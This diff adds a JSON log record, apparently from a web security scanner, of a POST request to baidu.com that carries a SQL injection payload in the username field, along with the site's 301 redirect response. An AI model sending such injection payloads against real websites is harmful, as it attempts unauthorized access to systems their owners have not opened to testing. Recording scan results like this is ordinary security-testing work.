@@ -1,0 +1,15 @@
+{
+  "request": {
+    "url": "engine_simulation",
+    "full_http_request": "POST /index.html HTTP/1.1\nHost: baidu.com\nContent-Type: application/json\nConnection: keep-alive\n\n{\"username\": \"admin' OR '1'='\", \"password\": \"admin123\"}"
+  },
+  "response": {
+    "statusCode": 200,
+    "httpResponseContent": "HTTP/1.1 301 Moved Permanently\r\nLocation: http://www.baidu.com/index.html\r\nDate: Tue, 06 Jan 2026 12:20:04 GMT\r\nContent-Length: 0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
+  },
+  "meta": {
+    "isPipeline": false
+  },
+  "recordId": "bf62b15fe179408fbed231aa904515d3",
+  "timestamp": "2026-01-06 20:20:03"
+}
